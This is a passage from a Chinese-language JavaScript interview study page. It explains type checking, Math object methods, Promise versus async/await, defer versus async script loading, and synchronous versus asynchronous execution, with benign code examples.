title=\"26、JavaScript有几种方法判断变量的类型?\"></a>26、JavaScript有几种方法判断变量的类型?</h3><p><strong>参考答案</strong>：</p>\n<ol>\n<li>使用typeof检测当需要判断变量是否是number, string, boolean, function, undefined等类型时，可以使用typeof进行判断。</li>\n<li>使用instanceof检测instanceof运算符与typeof运算符相似，用于识别正在处理的对象的类型。与typeof方法不同的是，instanceof 方法要求开发者明确地确认对象为某特定类型。</li>\n<li>使用constructor检测constructor本来是原型对象上的属性，指向构造函数。但是根据实例对象寻找属性的顺序，若实例对象上没有实例属性或方法时，就去原型链上寻找，因此，实例对象也是能使用constructor属性的。</li>\n</ol>\n<h3 id=\"27、Math\"><a href=\"#27、Math\" class=\"headerlink\" title=\"27、Math\"></a>27、Math</h3><h4 id=\"Math-对象方法\"><a href=\"#Math-对象方法\" class=\"headerlink\" title=\"Math 对象方法\"></a>Math 对象方法</h4><table>\n<thead>\n<tr>\n<th align=\"left\">方法</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-abs.html\">abs(x)</a></td>\n<td align=\"left\">返回 x 的绝对值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-acos.html\">acos(x)</a></td>\n<td align=\"left\">返回 x 的反余弦值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-asin.html\">asin(x)</a></td>\n<td align=\"left\">返回 x 的反正弦值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-atan.html\">atan(x)</a></td>\n<td align=\"left\">以介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间的数值来返回 x 的反正切值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-atan2.html\">atan2(y,x)</a></td>\n<td align=\"left\">返回从 x 轴到点 (x,y) 的角度（介于 -PI&#x2F;2 与 PI&#x2F;2 弧度之间）。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-ceil.html\">ceil(x)</a></td>\n<td align=\"left\">对数进行上舍入。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-cos.html\">cos(x)</a></td>\n<td align=\"left\">返回数的余弦。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-exp.html\">exp(x)</a></td>\n<td align=\"left\">返回 Ex 的指数。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-floor.html\">floor(x)</a></td>\n<td align=\"left\">对 x 进行下舍入。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-log.html\">log(x)</a></td>\n<td align=\"left\">返回数的自然对数（底为e）。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-max.html\">max(x,y,z,…,n)</a></td>\n<td align=\"left\">返回 x,y,z,…,n 中的最高值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-min.html\">min(x,y,z,…,n)</a></td>\n<td align=\"left\">返回 x,y,z,…,n中的最低值。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-pow.html\">pow(x,y)</a></td>\n<td align=\"left\">返回 x 的 y 次幂。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-random.html\">random()</a></td>\n<td align=\"left\">返回 0 ~ 1 之间的随机数。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-round.html\">round(x)</a></td>\n<td align=\"left\">四舍五入。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-sin.html\">sin(x)</a></td>\n<td align=\"left\">返回数的正弦。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-sqrt.html\">sqrt(x)</a></td>\n<td align=\"left\">返回数的平方根。</td>\n</tr>\n<tr>\n<td align=\"left\"><a href=\"https://www.runoob.com/jsref/jsref-tan.html\">tan(x)</a></td>\n<td align=\"left\">返回角的正切。</td>\n</tr>\n</tbody></table>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">Math<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">77</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">//ES6 的写法，等同于Math.max(14, 3, 77)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<p>题目：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> min <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> max <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>min <span class=\"token operator\">&lt;</span> max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 写出执行结果，并解释原因</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>答案</strong><br>false</p>\n<p><strong>解析</strong></p>\n<ul>\n<li>按常规的思路，这段代码应该输出 true，毕竟最小值小于最大值。但是却输出 false</li>\n<li>MDN 相关文档是这样解释的<ul>\n<li>Math.min 的参数是 0 个或者多个，如果多个参数很容易理解，返回参数中最小的。如果没有参数，则返回 Infinity，无穷大。</li>\n<li>而 Math.max 没有传递参数时返回的是-Infinity.所以输出 false</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"28、promise和-async-await-区别\"><a href=\"#28、promise和-async-await-区别\" class=\"headerlink\" title=\"28、promise和 async await 区别\"></a>28、promise和 async await 区别</h3><p><strong>参考答案：</strong></p>\n<ul>\n<li><p><strong>概念</strong><br><strong>Promise</strong> 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大，简单地说，Promise好比容器，里面存放着一些未来才会执行完毕（异步）的事件的结果，而这些结果一旦生成是无法改变的</p>\n<p><strong>async await</strong>也是异步编程的一种解决方案，他遵循的是Generator 函数的语法糖，他拥有内置执行器，不需要额外的调用直接会自动执行并输出结果，它返回的是一个Promise对象。</p>\n</li>\n<li><h5 id=\"两者的区别\"><a href=\"#两者的区别\" class=\"headerlink\" title=\"两者的区别\"></a>两者的区别</h5><ol>\n<li>Promise的出现解决了传统callback函数导致的“地域回调”问题，但它的语法导致了它向纵向发展行成了一个回调链，遇到复杂的业务场景，这样的语法显然也是不美观的。而async await代码看起来会简洁些，使得异步代码看起来像同步代码，await的本质是可以提供等同于”同步效果“的等待异步返回能力的语法糖，只有这一句代码执行完，才会执行下一句。</li>\n<li>async await与Promise一样，是非阻塞的。</li>\n<li>async await是基于Promise实现的，可以说是改良版的Promise，它不能用于普通的回调函数。</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"29、-defer和async区别\"><a href=\"#29、-defer和async区别\" class=\"headerlink\" title=\"29、 defer和async区别\"></a>29、 defer和async区别</h3><p><strong>参考答案：</strong></p>\n<p>区别主要在于一个执行时间,defer会在文档解析完之后执行,并且多个defer会按照顺序执行,而async则是在js加载好之后就会执行,并且多个async,哪个加载好就执行哪个</p>\n<p><strong>解析：</strong></p>\n<p>在没有defer或者async的情况下：会立即执行脚本,所以通常建议把script放在body最后</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>script.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>async：有async的话,加载和渲染后续文档元素的过程将和 script.js 的加载与执行并行进行（异步）。<br>但是多个js文件的加载顺序不会按照书写顺序进行</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">async</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>script.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>derer：有derer的话,加载后续文档元素的过程将和 script.js 的加载并行进行（异步），但是 script.js 的执行要在所有元素解析完成之后，DOMContentLoaded 事件触发之前完成,并且多个defer会按照顺序进行加载。</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">defer</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>script.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"30、同步和异步\"><a href=\"#30、同步和异步\" class=\"headerlink\" title=\"30、同步和异步\"></a>30、同步和异步</h3><p><strong>参考答案：</strong></p>\n<p>同步</p>\n<ul>\n<li>指在 <strong>主线程</strong>上排队执行的任务，只有前一个任务执行完毕，才能继续执行下一个任务。</li>\n<li>也就是调用一旦开始，必须这个调用 <strong>返回结果</strong>(划重点——）才能继续往后执行。程序的执行顺序和任务排列顺序是一致的。</li>\n</ul>\n<p>异步</p>\n<ul>\n<li>异步任务是指不进入主线程，而进入 <strong>任务队列</strong>的任务，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程。</li>\n<li>每一个任务有一个或多个 <strong>回调函数</strong>。前一个任务结束后，不是执行后一个任务,而是执行回调函数，后一个任务则是不等前一个任务结束就执行。</li>\n<li>程序的执行顺序和任务的排列顺序是<strong>不一致</strong>的，异步的。</li>\n<li>我们常用的setTimeout和setInterval函数，Ajax都是异步操作。</li>\n</ul>\n<h3 id=\"31、-实现异步的方法\"><a href=\"#31、-实现异步的方法\" class=\"headerlink\" title=\"31、 实现异步的方法\"></a>31、 实现异步的方法</h3><p><strong>参考答案：</strong></p>\n<p>回调函数（Callback）、事件监听、发布订阅、Promise&#x2F;A+、生成器Generators&#x2F; yield、async&#x2F;await</p>\n<ol>\n<li><p>JS 异步编程进化史：callback -&gt; promise -&gt; generator -&gt; async + await</p>\n</li>\n<li><p>async&#x2F;await 函数的实现，就是将 Generator 函数和自动执行器，包装在一个函数里。</p>\n</li>\n<li><p>async&#x2F;await可以说是异步终极解决方案了。</p>\n<p>(1) async&#x2F;await函数相对于Promise，优势体现在：</p>\n<ul>\n<li>处理 then 的调用链，能够更清晰准确的写出代码</li>\n<li>并且也能优雅地解决回调地狱问题。</li>\n</ul>\n<p>当然async&#x2F;await函数也存在一些缺点，因为 await 将异步代码改造成了同步代码，如果多个异步代码没有依赖性却使用了 await 会导致性能上的降低，代码没有依赖性的话，完全可以使用 Promise.all 的方式。</p>\n<p>(2) async&#x2F;await函数对 Generator 函数的改进，体现在以下三点：</p>\n<ul>\n<li>内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，<strong>async 函数的执行，与普通函数一模一样，只要一行</strong>。</li>\n<li>更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 <strong>async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）</strong>。</li>\n<li>更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。</li>\n</ul>\n</li>\n<li><p>async&#x2F;await</p>\n<p>Async&#x2F;Await简介</p>\n<p> 使用async&#x2F;await，你可以轻松地达成之前使用生成器和co函数所做到的工作,它有如下特点：</p>\n<ol>\n<li><p>async&#x2F;await是基于Promise实现的，它不能用于普通的回调函数。</p>\n</li>\n<li><p>async&#x2F;await与Promise一样，是非阻塞的。</p>\n</li>\n</ol>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">3. async&#x2F;await使得异步代码看起来像同步代码，这正是它的魔力所在。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>一个函数如果加上 async ，那么该函数就会返回一个 Promise</strong></p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">async1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token string\">\"1\"</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">async1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// -> Promise &#123;&lt;resolved>: \"1\"&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>Generator函数依次调用三个文件那个例子用async&#x2F;await写法，只需几句话便可实现</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> fs <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'fs'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFile</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">,</span> <span class=\"token string\">'utf8'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n      <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">readResult</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">params</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> p1 <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">,</span> <span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//await后面跟的是一个Promise实例</span>\n    <span class=\"token keyword\">let</span> p2 <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">,</span> <span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">let</span> p3 <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>p2<span class=\"token punctuation\">,</span> <span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p1'</span><span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">)</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p2'</span><span class=\"token punctuation\">,</span> p2<span class=\"token punctuation\">)</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p3'</span><span class=\"token punctuation\">,</span> p3<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> p3\n  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">readResult</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span> <span class=\"token comment\">// async函数返回的也是个promise</span>\n  <span class=\"token parameter\">data</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n  <span class=\"token parameter\">err</span> <span class=\"token operator\">=></span> console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// p1 2.txt</span>\n<span class=\"token comment\">// p2 3.txt</span>\n<span class=\"token comment\">// p3 结束</span>\n<span class=\"token comment\">// 结束</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ol>\n<p>5.2 Async&#x2F;Await并发请求</p>\n<p>如果请求两个文件，毫无关系，可以通过并发请求</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> fs <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'fs'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    fs<span class=\"token punctuation\">.</span><span class=\"token function\">readFile</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">,</span> <span class=\"token string\">'utf8'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err<span class=\"token punctuation\">,</span> data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span>\n      <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">readAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token function\">read1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token function\">read2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//这个函数同步执行</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">read1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> r <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">read2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> r <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token string\">'2.txt'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'utf8'</span><span class=\"token punctuation\">)</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">readAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 2.txt 3.txt</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<h3 id=\"32、-promise的介绍与使用\"><a href=\"#32、-promise的介绍与使用\" class=\"headerlink\" title=\"32、 promise的介绍与使用\"></a>32、 promise的介绍与使用</h3><p><strong>Promise 介绍：</strong></p>\n<p>ES6中的Promise 是异步编程的一种方案。从语法上讲，Promise 是一个对象，它可以获取异步操作的消息。</p>\n<p>Promise对象, 可以<strong>将异步操作以同步的流程表达出来</strong>。使用 Promise 主要有以下好处：</p>\n<ul>\n<li>可以很好地解决<strong>回调地狱</strong>的问题（避免了层层嵌套的回调函数）。</li>\n<li>语法非常简洁。Promise 对象提供了简洁的API，使得控制异步操作更加容易。</li>\n</ul>\n<p><strong>Promise 使用：</strong></p>\n<p><strong>语法</strong></p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> promise <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">/* executor函数 */</span>\n    <span class=\"token comment\">// ... some code</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token comment\">/* 异步操作成功 */</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\npromise<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//success</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//failure</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>参数<br><code>executor</code> 函数在<code>Promise</code>构造函数执行时同步执行，被传递 <code>resolve</code> 和 <code>reject</code> 函数（<code>executor</code>函数在<code>Promise</code>构造函数返回新建对象前被调用）。<br><code>executor</code> 内部通常会执行一些异步操作，一旦完成，可以调用<code>resolve</code>函数来将<code>promise</code>状态改成<code>fulfilled</code>(完成)，或者将<code>promise</code>的状态改为<code>rejected</code>(失败)。<br>如果在<code>executor</code>函数中抛出一个错误，那么该<code>promise</code> 状态为<code>rejected</code>。<code>executor</code>函数的返回值被忽略。</li>\n<li>简单使用</li>\n</ol>\n<pre class=\"line-numbers language-jsx\" data-language=\"jsx\"><code class=\"language-jsx\"><span class=\"token keyword\">function</span> <span class=\"token function\">timeout</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">ms</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> ms<span class=\"token punctuation\">,</span> <span class=\"token string\">'done'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">timeout</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//done</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>原型方法</strong></p>\n<p>Promise.prototype.then(onFulfilled, onRejected)</p>\n<ol>\n<li><p>语法<br><code>p.then(onFulfilled, onRejected);</code><br><code>p.then((value) =&gt; &#123;// fulfillment&#125;, (reason) =&gt; &#123;// rejection&#125;);</code></p>\n</li>\n<li><p>含义<br>为 